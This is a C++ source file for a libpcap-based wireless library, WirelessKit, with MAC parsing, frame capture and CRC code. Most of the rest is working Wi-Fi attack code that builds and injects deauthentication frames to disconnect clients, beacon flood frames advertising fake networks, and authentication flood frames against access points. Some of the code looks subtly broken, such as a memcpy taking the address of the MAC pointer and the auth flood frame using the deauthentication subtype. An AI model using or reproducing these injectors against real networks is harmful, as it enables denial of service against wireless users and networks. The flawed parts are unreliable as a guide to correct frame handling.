/*
 *  WirelessKit.cpp
 *  WirelessKit
 *
 *  Created by BlueCocoa on 2017/5/19.
 *  Copyright © 2017 BlueCocoa. All rights reserved.
 *
 */

#include "WirelessKit.hpp"
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <random>
#include <sstream>
#include <thread>

using namespace WirelessKit;

#pragma mark
#pragma mark - MAC

MAC::MAC(const uint8_t mac[6]) {
    uint8_t * ptr = new uint8_t[6];
    this->_data = std::make_shared<uint8_t *>(ptr);
    memcpy(this->_data.get(), &mac, sizeof(uint8_t) * 6);
    this->_valid = true;
}

MAC::MAC(const std::string mac) {
    if (mac.length() != 17) {
        _valid = false;
    } else {
        bool ok = true;
        uint8_t * ptr = new uint8_t[6];
        this->_data = std::make_shared<uint8_t *>(ptr);
        for (int i = 0; i < 17; ++i) {
            uint8_t c = mac[i];
            if ((i + 1) % 3 == 0) {
                if (c != ':') {
                    ok = false;
                    break;
                }
            } else {
                if ('a' <= c && c <= 'f') {
                    c -= 'a' - 'A';
                }
                if (!(('0' <= c && c <= '9') || ('A' <= c && c <= 'F'))) {
                    ok = false;
                    break;
                } else {
                    uint8_t hex_value = 0;
                    if ('0' <= c && c <= '9') {
                        hex_value = c - '0';
                    } else {
                        hex_value = c - 'A' + 10;
                    }
                    uint8_t * ptr = *this->_data.get();
                    ptr[i / 3] += hex_value * (i % 3 == 0 ? 16 : 1);
                }
            }
        }
        _valid = ok;
    }
}

MAC::MAC(const MAC & _) {
    uint8_t * mac = *_._data;
    uint8_t * ptr = new uint8_t[6];
    memcpy(ptr, mac, sizeof(uint8_t) * 6);
    this->_data = std::make_shared<uint8_t *>(ptr);
    this->_valid = _._valid;
}

MAC::~MAC() {
    this->_data.reset();
}

bool MAC::is_valid() const {
    return this->_valid;
}

std::string MAC::stringify() const {
    uint8_t mac[18] = {'0'};
    uint8_t * ptr = *this->_data.get();
    sprintf((char *)mac, "%02X:%02X:%02X:%02X:%02X:%02X", ptr[0], ptr[1], ptr[2], ptr[3], ptr[4], ptr[5]);
    std::string r = std::string((char *)mac);
    return r;
}

bool MAC::is_equal(const MAC & _) {
    return MAC::is_equal(*this, _);
}

bool MAC::is_equal(const MAC & a, const MAC & b) {
    if (a._data.get() && b._data.get()) {
        uint8_t * ptr_a = *a._data.get();
        uint8_t * ptr_b = *b._data.get();
        for (int i = 0; i < 6; i++) {
            if (ptr_a[i] != ptr_b[i]) {
                return false;
            }
        }
        return true;
    }
    return false;
}

MAC MAC::random() {
    uint8_t random_mac[6] = {0};
    std::random_device uint8_random_device;
    std::mt19937 uint8_random_engine(uint8_random_device());
    std::uniform_int_distribution<uint8_t> uniform_distribution(0, 0xFF);
    for (int i = 0; i < 6; i++) random_mac[i] = uniform_distribution(uint8_random_engine);
    return MAC(random_mac);
}

MAC MAC::broadcast() {
    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    return MAC(broadcast_mac);
}

uint8_t * MAC::mac_copy() const {
    uint8_t * data_copy = new uint8_t[6];
    memcpy(data_copy, *this->_data.get(), sizeof(uint8_t) * 6);
    return data_copy;
}

uint8_t * MAC::mac() {
    return *this->_data.get();
}

#pragma mark
#pragma mark - AP

AP::AP() {
    this->_mac = std::make_shared<MAC>(MAC::broadcast());
}

AP::~AP() {
    this->_mac.reset();
}

AP::AP(const MAC & mac) {
    if (mac.is_valid()) {
        this->_mac = std::make_shared<MAC>(mac);
    }
}

AP::AP(const AP & _) {
    this->_SSID = _._SSID;
    this->_mac = _._mac;
}

AP::AP(std::string SSID, const MAC & mac) {
    if (mac.is_valid()) {
        this->_mac = std::make_shared<MAC>(mac);
    }
    this->_SSID = SSID;
}

bool AP::setMAC(const MAC & mac) {
    if (mac.is_valid()) {
        this->_mac = std::make_shared<class MAC>(mac);
        return true;
    }
    return false;
}

void AP::setSSID(std::string SSID) {
    this->_SSID = SSID;
}

uint8_t * AP::mac_copy() const {
    return this->_mac->mac_copy();
}

uint8_t * AP::mac() {
    return this->_mac->mac();
}

#pragma mark
#pragma mark - STA

STA::STA() {
    this->_mac = std::make_shared<MAC>(MAC::broadcast());
}

STA::~STA() {
    this->_mac.reset();
}

STA::STA(const MAC & mac) {
    if (mac.is_valid()) {
        this->_mac = std::make_shared<MAC>(mac);
    }
}

STA::STA(const STA & _) {
    this->_mac = _._mac;
}

bool STA::setMAC(const MAC & mac) {
    if (mac.is_valid()) {
        this->_mac = std::make_shared<MAC>(mac);
        return true;
    }
    return false;
}

uint8_t * STA::mac_copy() const {
    return this->_mac->mac_copy();
}

uint8_t * STA::mac() {
    return this->_mac->mac();
}

#pragma mark
#pragma mark - Interface

Interface::Interface(std::string ifname) {
    this->_ifname = ifname;
}

Interface::Interface(const Interface & _) {
    this->_ifname = _._ifname;
    this->_pcap_handle = _._pcap_handle;
}

Interface::~Interface() {
}

bool Interface::open() {
    if (this->_pcap_handle == NULL) {
        char pcap_error[PCAP_ERRBUF_SIZE];
        this->_pcap_handle = pcap_open_live(this->_ifname.c_str(), 65536, 1, 1, pcap_error);
        if (!this->_pcap_handle) {
            fprintf(stderr, "%s: %s\n", __PRETTY_FUNCTION__, pcap_error);
            return false;
        }
        pcap_set_datalink(this->_pcap_handle, DLT_IEEE802_11_RADIO);
    }
    return true;
}

bool Interface::setChannel(int channel) {
    std::ostringstream cli;
#if defined(__APPLE__)
    cli << "change_channel " << this->_ifname.c_str() << ' ' << channel;
#elif defined(__RASPBIAN__)
    cli << "iwconfig " << this->_ifname.c_str() << " channel " << channel;
#endif
    return system(cli.str().c_str()) == 0;
}

#pragma mark
#pragma mark - MACHeader

MACHeader::MACHeader() {
    memset(&this->fc, 0, sizeof(struct FrameControl));
}

MACHeader::MACHeader(const MACHeader & _) {
    this->fc = _.fc;
    this->duration = _.duration;
    this->sequence = _.sequence;
    this->_destination = _._destination;
    this->_transmitter = _._transmitter;
    this->_source = _._source;
}

MACHeader::MACHeader(const uint8_t * header_data) {
    size_t ptr = 0;
    memcpy(&this->fc, &header_data[ptr], sizeof(struct FrameControl)); ptr += sizeof(struct FrameControl);
    memcpy(&this->duration, &header_data[ptr], sizeof(uint16_t)); ptr += sizeof(uint16_t);
    this->setDestination(MAC(&header_data[ptr])); ptr += sizeof(uint8_t) * 6;
    this->setTransmitter(MAC(&header_data[ptr])); ptr += sizeof(uint8_t) * 6;
    this->setSource(MAC(&header_data[ptr])); ptr += sizeof(uint8_t) * 6;
    memcpy(&this->sequence, &header_data[ptr], sizeof(uint16_t));
}

MACHeader::~MACHeader() {
    this->_destination.reset();
    this->_transmitter.reset();
    this->_source.reset();
}

void MACHeader::setDestination(const MAC & destination) {
    this->_destination = std::make_shared<MAC>(destination);
}

void MACHeader::setDestination(const std::shared_ptr<MAC> destination) {
    this->_destination = destination;
}

void MACHeader::setTransmitter(const MAC & transmitter) {
    this->_transmitter = std::make_shared<MAC>(transmitter);
}

void MACHeader::setTransmitter(const std::shared_ptr<MAC> transmitter) {
    this->_transmitter = transmitter;
}

void MACHeader::setSource(const MAC & source) {
    this->_source = std::make_shared<MAC>(source);
}

void MACHeader::setSource(const std::shared_ptr<MAC> source) {
    this->_source = source;
}

MAC * MACHeader::destination() const {
    return this->_destination.get();
}

MAC * MACHeader::transmitter() const {
    return this->_transmitter.get();
}

MAC * MACHeader::source() const {
    return this->_source.get();
}

uint8_t * MACHeader::data() const {
    uint8_t * data = new uint8_t[24];
    size_t ptr = 0;
    memcpy(&data[ptr], &this->fc, sizeof(struct FrameControl)); ptr += sizeof(struct FrameControl);
    memcpy(&data[ptr], &this->duration, sizeof(uint16_t)); ptr += sizeof(uint16_t);
    memcpy(&data[ptr], this->_destination->mac(), sizeof(uint8_t) * 6); ptr += sizeof(uint8_t) * 6;
    memcpy(&data[ptr], this->_transmitter->mac(), sizeof(uint8_t) * 6); ptr += sizeof(uint8_t) * 6;
    memcpy(&data[ptr], this->_source->mac(), sizeof(uint8_t) * 6); ptr += sizeof(uint8_t) * 6;
    memcpy(&data[ptr], &this->sequence, sizeof(uint16_t));
    return data;
}

#pragma mark
#pragma mark - CapturedPacket

CapturedPacket::CapturedPacket(struct pcap_pkthdr * header, const u_char * buffer) {
    if (!header || !buffer) {
        this->_valid = false;
        return;
    }
    
    uint16_t * words = (uint16_t *)buffer;
    if (words[1] >=  header->caplen) {
        this->_valid = false;
        return;
    }
    
    const u_char * dataBuffer = (const u_char *)buffer + words[1];
    this->_packet_len = header->caplen - words[1];
    if (this->_packet_len < 24) {
        this->_valid = false;
        this->_packet_len = 0;
        return;
    }
    
    this->_packet_data = new uint8_t[this->_packet_len];
    memcpy((void *)this->_packet_data, dataBuffer, this->_packet_len);
    
    this->_body_data = (const uint8_t *)this->_packet_data + 24;
    this->_body_len = this->_packet_len - 24;
    
    uint32_t dataFCS = 0;
    if (this->_body_len >= 4) {
        dataFCS = *(uint32_t *)(&this->_body_data[this->_body_len - 4]);
    }
    uint32_t calculateFCS = ~crc32((const char *)this->_packet_data, this->_packet_len - 4);
    if (dataFCS != calculateFCS) {
        this->_valid = false;
        this->_packet_len = 0;
        this->_body_len = 0;
        delete [] this->_packet_data;
        this->_packet_data = NULL;
        this->_body_data = NULL;
        return;
    }
    
    this->_valid = true;
    this->_header = std::make_shared<MACHeader>(MACHeader(this->_packet_data));
}

CapturedPacket::CapturedPacket(const CapturedPacket & _) {
    this->_valid = _._valid;
    this->_header = std::make_shared<MACHeader>(*_._header.get());
    this->_packet_len = _._packet_len;
    this->_body_len = _._body_len;
    if (this->_valid) {
        this->_packet_data = new uint8_t[this->_packet_len];
        memcpy(&this->_packet_data, _._packet_data, this->_packet_len);
        this->_body_data = this->_packet_data + 24;
    }
}

CapturedPacket::~CapturedPacket() {
    if (this->_valid) delete [] this->_packet_data;
    this->_valid = false;
    this->_packet_len = 0;
    this->_body_len = 0;
    this->_packet_data = NULL;
    this->_body_data = NULL;
}

bool CapturedPacket::is_valid() const {
    return this->_valid;
}

MACHeader * CapturedPacket::header() const {
    return this->_header.get();
}

const u_char * CapturedPacket::packet_data() const {
    return this->_packet_data;
}

const u_char * CapturedPacket::body_data() const {
    return this->_body_data;
}

int CapturedPacket::packet_len() const {
    return this->_packet_len;
}

int CapturedPacket::body_len() const {
    return this->_body_len;
}

#pragma mark
#pragma mark - Utility
#pragma mark - Sniffer

Sniffer::Sniffer() {
}

Sniffer::Sniffer(const Interface ifname) {
    this->_ifname = std::make_shared<Interface>(ifname);
}

Sniffer::~Sniffer() {
    this->_ifname.reset();
    if (this->_capturer.get()) this->_capturer->join();
    this->_capturer.reset();
}

CapturedPacket Sniffer::capture_block() {
    if (this->_ifname.get()) {
        struct pcap_pkthdr * packet = NULL;
        uint8_t * data = NULL;
        while (pcap_next_ex(this->_ifname->_pcap_handle, &packet, (const u_char **)&data) == 1) {
            if (data) break;
        }
        return CapturedPacket(packet, data);
    } else {
        return CapturedPacket(NULL, NULL);
    }
}

void Sniffer::capture(std::function<bool(const CapturedPacket & captured)> callback) {
    this->_capturer = std::make_shared<std::thread>([&]{
        struct pcap_pkthdr packet;
        uint8_t * data = NULL;
        bool shoud_capture = true;
        while (shoud_capture && this->_ifname->_pcap_handle) {
            usleep(10000);
            data = (uint8_t *)pcap_next(this->_ifname->_pcap_handle, &packet);
            if (data) {
                CapturedPacket captured(&packet, data);
                shoud_capture = callback(captured);
            }
        }
    });
}

uint32_t WirelessKit::crc32(const char *buf, size_t len)
{
    
    static const uint32_t crc_32_tab[] = { /* CRC polynomial 0xedb88320 */
        0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f,
        0xe963a535, 0x9e6495a3, 0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,
        0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, 0x1db71064, 0x6ab020f2,
        0xf3b97148, 0x84be41de, 0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,
        0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9,
        0xfa0f3d63, 0x8d080df5, 0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,
        0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b, 0x35b5a8fa, 0x42b2986c,
        0xdbbbc9d6, 0xacbcf940, 0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,
        0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423,
        0xcfba9599, 0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,
        0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, 0x76dc4190, 0x01db7106,
        0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,
        0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d,
        0x91646c97, 0xe6635c01, 0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,
        0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950,
        0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,
        0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7,
        0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,
        0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa,
        0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,
        0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81,
        0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,
        0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683, 0xe3630b12, 0x94643b84,
        0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,
        0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb,
        0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,
        0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5, 0xd6d6a3e8, 0xa1d1937e,
        0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,
        0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55,
        0x316e8eef, 0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,
        0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe, 0xb2bd0b28,
        0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,
        0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f,
        0x72076785, 0x05005713, 0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,
        0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242,
        0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,
        0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69,
        0x616bffd3, 0x166ccf45, 0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,
        0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc,
        0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,
        0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693,
        0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,
        0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d
    };
    
    uint32_t crc = 0xFFFFFFFF;
#define UPDC32(octet,crc) (crc_32_tab[((crc) ^ (octet)) & 0xff] ^ ((crc) >> 8))
    for ( ; len; --len, ++buf)
    {
        crc = UPDC32(*buf, crc);
    }
    
    return crc;
}

#pragma mark
#pragma mark - Extented Types
#pragma mark - DeauthClient

DeauthClient::DeauthClient(const AP & ap, const STA & station) {
    this->_ap = std::make_shared<AP>(ap);
    this->_station = std::make_shared<STA>(station);
}

DeauthClient::DeauthClient(const DeauthClient & _) {
    this->_station = _._station;
    this->_ap = _._ap;
}

DeauthClient::~DeauthClient() {
}

uint8_t * DeauthClient::packet(size_t * bytes) const {
//    static const auto DEAUTH_REQ =
//        "\xC0\x00"                  /* Type: Management Subtype: Deauthentication  */ \
//        "\x3C\x00"                  /* Duration */ \
//        "\xCC\xCC\xCC\xCC\xCC\xCC"  /* Destination MAC Address */ \
//        "\xBB\xBB\xBB\xBB\xBB\xBB"  /* Transmitter MAC Address */ \
//        "\xBB\xBB\xBB\xBB\xBB\xBB"  /* BSSID */\
//        "\x00\x00"                  /* Sequence Number */;
    MACHeader deauth_req;
    deauth_req.fc.type = 0;
    deauth_req.fc.subtype = 12;
    deauth_req.duration = 0x003C;
    deauth_req.setDestination(this->_station->_mac);
    deauth_req.setTransmitter(this->_ap->_mac);
    deauth_req.setSource(this->_ap->_mac);
    
    uint8_t * _deauth_packet = new uint8_t[34];
    uint16_t radioLen = 8;
    uint8_t * deauth_header = deauth_req.data();
    uint16_t resaon = 0x0001;
    
    memcpy(&_deauth_packet[2], &radioLen, 2);
    memcpy(&_deauth_packet[8], deauth_header, 24);
    memcpy(&_deauth_packet[32], &resaon, 2);
    
    delete [] deauth_header;
    *bytes = 34;
    return _deauth_packet;
}

void DeauthClient::deauth(const Interface & ifname) const {
    size_t len = 0;
    uint8_t * packet = this->packet(&len);
    pcap_inject(ifname._pcap_handle, packet, len);
    delete [] packet;
}

#pragma mark
#pragma mark - BeaconFloodFrame

BeaconFloodFrame::BeaconFloodFrame(const AP & ap) {
    this->_ap = std::make_shared<AP>(ap);
    this->_ap->beaconCapabilitiesInfo.ESS = 1;
    this->_ap->beaconCapabilitiesInfo.Privacy = 1;
}

uint8_t * BeaconFloodFrame::packet(size_t * bytes) const {
//    static const auto BEACON_FRAME =
//        "\x80\x00"                  /* Type: Management Subtype: Beacon */ \
//        "\x00\x00"                  /* Duration */ \
//        "\xFF\xFF\xFF\xFF\xFF\xFF"  /* Destination MAC Address: Broadcast */ \
//        "\xBB\xBB\xBB\xBB\xBB\xBB"  /* Transmitter MAC Address */ \
//        "\xBB\xBB\xBB\xBB\xBB\xBB"  /* BSSID */ \
//        "\x00\x00"                  /* Sequence number & Fragment number */;
    static const auto BEACON_INTERVAL =
        "\x64\x00"                  /* 0.1024 seconds */;
    static const auto BEACON_TAG_INFO =
    "\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24\x03\x01\x01\x05\x04\x00\x01\x00\x00\x2a\x01\x06\x32\x04\x30\x48\x60\x6c\x2d\x1a\x2c\x18\x1f\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3d\x16\x01\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xdd\x1a\x00\x50\xf2\x01\x01\x00\x00\x50\xf2\x02\x02\x00\x00\x50\xf2\x02\x00\x50\xf2\x04\x01\x00\x00\x50\xf2\x02\x30\x18\x01\x00\x00\x0f\xac\x02\x02\x00\x00\x0f\xac\x02\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x02\x00\x00\xdd\x18\x00\x50\xf2\x02\x01\x01\x00\x00\x03\xa4\x00\x00\x27\xa4\x00\x00\x42\x43\x5e\x00\x62\x32\x2f\x00\xdd\x1e\x00\x90\x4c\x33\x2c\x18\x1f\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xdd\x1a\x00\x90\x4c\x34\x01\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xdd\x06\x00\xe0\x4c\x02\x01\x60\xdd\x0e\x00\x50\xf2\x04\x10\x4a\x00\x01\x10\x10\x44\x00\x01\x02";

    MACHeader beacon_header;
    beacon_header.fc.type = 0;
    beacon_header.fc.subtype = 8;
    beacon_header.duration = 0x0000;
    beacon_header.setDestination(MAC::broadcast());
    if (this->_ap->_mac.get() == NULL) this->_ap->setMAC(MAC::random());
    beacon_header.setTransmitter(this->_ap->_mac);
    beacon_header.setSource(this->_ap->_mac);
    uint8_t * beacon_header_data = beacon_header.data();
    
    
    uint8_t * packet = new uint8_t[44 + 244 + this->_ap->_SSID.length()];
    
    uint16_t header_len = 8;
    memcpy(&packet[2], &header_len, sizeof(uint16_t));
    memcpy(&packet[8], beacon_header_data, 24);
    delete [] beacon_header_data;

    uint64_t timestamp = time(NULL);
    memcpy(&packet[32], &timestamp, sizeof(uint64_t));
    memcpy(&packet[40], BEACON_INTERVAL, 2);
    memcpy(&packet[42], &this->_ap->beaconCapabilitiesInfo, sizeof(struct BeaconCapabilitiesInfo));
    
    ssize_t ptr = 44;
    uint8_t tag_number = 0;
    uint8_t tag_length = this->_ap->_SSID.length();
    memcpy(&packet[ptr], &tag_number, sizeof(uint8_t)); ptr += sizeof(uint8_t);
    memcpy(&packet[ptr], &tag_length, sizeof(uint8_t)); ptr += sizeof(uint8_t);
    memcpy(&packet[ptr], this->_ap->_SSID.c_str(), tag_length); ptr += tag_length;
    
    memcpy(&packet[ptr], BEACON_TAG_INFO, 244); ptr += 244;
    *bytes = ptr;
    
    return packet;
}

void BeaconFloodFrame::beacon(const Interface & ifname) const {
    size_t len = 0;
    uint8_t * packet = this->packet(&len);
    pcap_inject(ifname._pcap_handle, packet, len);
    delete [] packet;
}

#pragma mark
#pragma mark - AuthFloodFrame

AuthFloodFrame::AuthFloodFrame(const AP & ap) {
    this->_ap = std::make_shared<AP>(ap);
}

uint8_t * AuthFloodFrame::packet(size_t * bytes) const {
//    static const auto AUTH_REQ =
//        "\xB0\x00"                  /* Type: Management Subtype: Authentication */ \
//        "\x3A\x01"                  /* Duration */ \
//        "\xBB\xBB\xBB\xBB\xBB\xBB"  /* Destination MAC Address */ \
//        "\xCC\xCC\xCC\xCC\xCC\xCC"  /* Transmitter MAC Address */ \
//        "\xBB\xBB\xBB\xBB\xBB\xBB"  /* BSSID */ \
//        "\x00\x00"                  /* Sequence number & Fragment number */;
    static const auto AUTH_FIXED =
        "\x00\x00"                  /* Authentication Algorithm */ \
        "\x01\x00"                  /* Authentication SEQ */ \
        "\x00\x00"                  /* Status Code */;
    
    MACHeader auth_header;
    auth_header.fc.type = 0;
    auth_header.fc.subtype = 12;
    auth_header.duration = 0x003C;
    auth_header.setDestination(MAC::random());
    auth_header.setTransmitter(this->_ap->_mac);
    auth_header.setSource(this->_ap->_mac);
    uint8_t * auth_header_data = auth_header.data();
    
    uint8_t * data = new uint8_t[38];

    uint16_t header_len = 8;
    memcpy(&data[2], &header_len, sizeof(uint16_t));
    memcpy(&data[8], auth_header_data, 24);
    memcpy(&data[32], AUTH_FIXED, 6);
    
    delete [] auth_header_data;
    *bytes = 38;
    return data;
}

void AuthFloodFrame::auth(const Interface & ifname) const {
    size_t len = 0;
    uint8_t * packet = this->packet(&len);
    pcap_inject(ifname._pcap_handle, packet, 38);
    delete [] packet;
}
